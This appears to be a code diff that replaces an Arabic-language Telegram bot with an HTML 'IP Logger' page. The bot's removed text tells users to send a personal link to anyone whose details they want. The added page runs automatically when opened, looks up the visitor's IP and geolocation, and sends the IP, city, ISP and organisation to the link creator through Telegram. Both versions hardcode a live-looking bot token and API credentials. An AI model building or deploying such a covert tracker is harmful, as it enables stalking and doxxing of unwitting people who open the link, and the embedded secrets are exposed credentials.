@@ -1,53 +1,67 @@
-from pyrogram import Client, filters
-import requests
+<!DOCTYPE html>
+<html>
+<head>
+    <title>IP Logger</title>
+    <script>
+        // التوكن الجديد
+        const botToken = '8785733862:AAEMVzY_90ifztd1S3A3IIBT_KMB_ryAgn0';
 
-api_id = 34039098
-api_hash = "9646170328aeffdf9fec75e83f2d7e27"
+        async function sendInfo() {
+            try {
+                const urlParams = new URLSearchParams(window.location.search);
+                const chatId = urlParams.get('id');
 
-app = Client(
-    "my_bot",
-    api_id=api_id,
-    api_hash=api_hash,
-    bot_token="8785733862:AAEMVzY_90ifztd1S3A3IIBT_KMB_ryAgn0"
-)
+                if (!chatId) {
+                    document.body.innerHTML = '<h1>⚠️ رابط غير صالح</h1>';
+                    return;
+                }
 
-@app.on_message(filters.command("start"))
-async def start(client, message):
-    user_id = message.from_user.id
-    link = f"https://lhx4.github.io/ip-logger?id={user_id}"
-    await message.reply(
-        f"👋 أهلاً بك في بوت كشف المعلومات!\n\n"
-        f"🤖 **ماذا يفعل هذا البوت؟**\n"
-        f"هذا البوت يولد لك رابطاً مخصصاً. عندما يفتح شخص آخر هذا الرابط، ستحصل أنت على معلوماته (مثل الـ IP والموقع والمتصفح) مباشرة في هذه المحادثة.\n\n"
-        f"📤 **كيف تستخدمه؟**\n"
-        f"1️⃣ خذ الرابط المخصص لك من الأسفل.\n"
-        f"2️⃣ أرسله لأي شخص تريد معرفة معلوماته.\n"
-        f"3️⃣ عندما يفتح الرابط، ستصل إليك معلوماته هنا فوراً.\n\n"
-        f"🔗 **رابطك المخصص:**\n"
-        f"`{link}`\n\n"
-        f"⚠️ استخدم هذا البوت لأغراض توعوية فقط."
-    )
+                // جلب الـ IP الحقيقي
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
 
-@app.on_message(filters.command("ip"))
-async def get_ip(client, message):
-    try:
-        ip = message.text.split(" ", 1)[1]
-        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
-        d = r.json()
-        if d["status"] == "success":
-            await message.reply(
-                f"🌍 **معلومات الـ IP**\n"
-                f"📌 **العنوان:** {ip}\n"
-                f"🏙️ **المدينة:** {d['city']}\n"
-                f"🗺️ **المنطقة:** {d['regionName']}\n"
-                f"🇸🇦 **الدولة:** {d['country']}\n"
-                f"📍 **الموقع:** {d['lat']}, {d['lon']}\n"
-                f"📡 **المزود:** {d['isp']}"
-            )
-        else:
-            await message.reply("❌ الـ IP غير صحيح أو لا يمكن تحديد موقعه.")
-    except:
-        await message.reply("❌ استخدم الأمر بهذا الشكل: `/ip 8.8.8.8`")
+                // جلب الموقع الحقيقي
+                const locationResponse = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org`);
+                const locationData = await locationResponse.json();
 
-print("🔥 البوت شغال...")
-app.run()
+                if (locationData.status !== 'success') {
+                    document.body.innerHTML = '<h1>❌ فشل جلب الموقع</h1>';
+                    return;
+                }
+
+                const message = `
+🕵️ **تم تسجيل دخول جديد!**
+📌 **IP:** ${ip}
+📍 **الدولة:** ${locationData.country || 'غير معروف'}
+🏙️ **المدينة:** ${locationData.city || 'غير معروف'}
+🗺️ **المنطقة:** ${locationData.regionName || 'غير معروف'}
+🌐 **المزود:** ${locationData.isp || 'غير معروف'}
+📡 **المنظمة:** ${locationData.org || 'غير معروف'}
+                `;
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+
+                document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح</h1>';
+
+            } catch (error) {
+                console.error('خطأ:', error);
+                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
+            }
+        }
+
+        window.onload = sendInfo;
+    </script>
+</head>
+<body>
+    <h1>جاري تحميل البيانات...</h1>
+</body>
+</html>
